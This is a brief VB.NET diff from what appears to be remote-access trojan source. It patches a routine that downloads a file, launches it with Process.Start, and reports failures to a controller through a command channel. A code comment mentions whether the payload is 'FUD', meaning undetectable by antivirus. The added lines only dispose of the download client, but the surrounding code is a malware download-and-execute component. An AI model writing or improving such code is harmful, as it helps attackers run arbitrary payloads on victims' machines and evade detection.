@@ -18,6 +18,13 @@
                         Diagnostics.Process.Start(file)
                     End If
                 End If
+
+                Try
+                    WC.Dispose()
+                    WC = Nothing
+                Catch ex As Exception
+                End Try
+
             Catch ex As Exception
                 C_Main.C.Send("MSG" + C_Main.SPL + "DWN Error! " + ex.Message) 'Maybe file is not FUD or link problem
             End Try
